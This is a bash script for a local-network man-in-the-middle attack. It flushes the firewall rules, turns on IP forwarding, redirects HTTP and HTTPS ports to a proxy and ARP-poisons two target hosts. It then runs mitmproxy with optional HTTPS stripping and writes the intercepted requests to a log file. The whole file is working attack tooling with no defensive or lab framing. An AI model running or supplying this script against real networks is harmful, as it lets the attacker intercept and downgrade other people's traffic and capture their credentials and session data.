#! /bin/bash

INTERACTIVE_MODE=0
HTTP_INTERCEPTION=0
HTTPS_INTERCEPTION=0
HTTPS_STRIPPING=0
INTERFACE=""
#####################################
# Displays help
#####################################
function help(){
	echo "Usage: $0 [-g] [-n] [-s] [-x] [-i] <interface> ip_target1 ip_target2"
	echo "       [-g] interactive mode for mitmproxy"
	echo "       [-n] capture HTTP traffic"
	echo "       [-s] capture HTTPS traffic"
	echo "       [-x] stripping https"
	echo "       [-i] interface"
        exit 1
}

#####################################
# Checking is root
#####################################
if [ $(id -u) -ne 0 ]; then
    echo "You'd better be root! Exiting..."
    exit
fi

if [ $# -lt 2 ] || [ $# -gt 8 ]; then
    help
fi

#getting options -ins
while getopts ":gnsxi:" OPT; do
    case $OPT in
        g)
            INTERACTIVE_MODE=1
	    echo "INTERACTIVE_MODE On"
            ;;
        n)
            HTTP_INTERCEPTION=1
	    echo "HTTP_INTERCEPTION On"
            ;;
        s)
            HTTPS_INTERCEPTION=1
	    echo "HTTPS_INTERCEPTION On"
            ;;
        x)
            HTTPS_STRIPPING=1
	    echo "HTTPS_STRIPPING On"
            ;;
        i)
            INTERFACE=${OPTARG}
            ;;
        :)
            echo "Invalid option $OPT"
            help
            ;;
    esac
done

shift $(($OPTIND - 1))
TARGET1=$1
TARGET2=$2

# Check target ips are not null
if [ "X"${TARGET1} == "X" ] || [ "X"${TARGET2} == "X" ]; then
	echo "target ip is missing!"
	help
fi

if [ ${HTTP_INTERCEPTION} -eq 1 ] || [ ${HTTPS_INTERCEPTION} -eq 1 ]; then

	# Check if interface is not null
	if [ "X"${INTERFACE} == "X" ]; then
		echo "interface is missing!"
		help
	fi

	echo "Flushing iptables..."
	#####################################
	# flushing routing configuration
	#####################################
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	echo "Setting configuration..."
	#####################################
	# routing configuration
	#####################################
	sysctl -w net.ipv4.ip_forward=1 &>/dev/null

	#avoid icmp redirect
	echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects &>/dev/null

        #iptables redirect from 80 to 8080 on localhost
        if [ ${HTTP_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i ${INTERFACE} -p tcp --dport 80 -j REDIRECT --to-port 8080
	fi

 	#iptables redirect from 443 to 8080 on localhost
        if [ ${HTTPS_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i ${INTERFACE} -p tcp --dport 443 -j REDIRECT --to-port 8080
	fi
fi

arpoison ${TARGET1} ${TARGET2}

#####################################
# mitmproxy
#####################################
SSLSTRIP_SCRIPT=""

if [ ${HTTPS_STRIPPING} -eq 1 ]; then
	SSLSTRIP_SCRIPT="--script ./script/sslstrip.py"
fi

if [ ${INTERACTIVE_MODE} -eq 1 ]; then
	xterm -maximized -T "mitmproxy" -hold -e ${MITMVENV_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --script "./script/io_write_dumpfile.py ./log/requests.log" ${SSLSTRIP_SCRIPT} --eventlog &
else
	echo "Running mitmdump..."
	${MITMVENV_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "./script/io_write_dumpfile.py ./log/requests.log" ${SSLSTRIP_SCRIPT}
fi

